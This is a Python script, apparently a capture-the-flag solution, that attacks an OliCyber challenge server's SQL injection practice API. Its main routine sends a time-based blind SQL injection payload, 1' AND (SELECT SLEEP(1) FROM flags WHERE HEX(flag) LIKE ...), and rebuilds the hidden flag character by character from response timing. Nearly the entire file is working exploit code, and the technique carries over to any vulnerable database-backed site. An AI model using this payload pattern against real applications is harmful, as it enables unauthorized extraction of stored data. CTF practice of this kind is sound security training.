#!/usr/bin/env python3

import requests
import binascii
from time import time

class Inj:
    def __init__(self,host):
        self.sess = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()
    
    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self,url,query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url,json=data, headers=headers).json()
    
    def logic(self,query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url,query)
        return response['result'], response['sql_error']
    
    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
def main():
    inj = Inj('http://web-17.challs.olicyber.it')
    
    dictionary = '0123456789abcdef'
    result = ''
    while True: 
        for c in dictionary:
            question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
            start = time()
            #print(start)
            inj.time(question)
            elapsed = time() - start
            #print(elapsed)
            if elapsed > 1:
                print("Character found!")
                result +=c
                print(result)
                break
        else:
            break #nothing else to find
    res = ''.join([chr(int(result[i:i+2], 16)) for i in range(0, len(result), 2)]) #decode the string in utf-8
    print(res)

if __name__ == "__main__":
    main()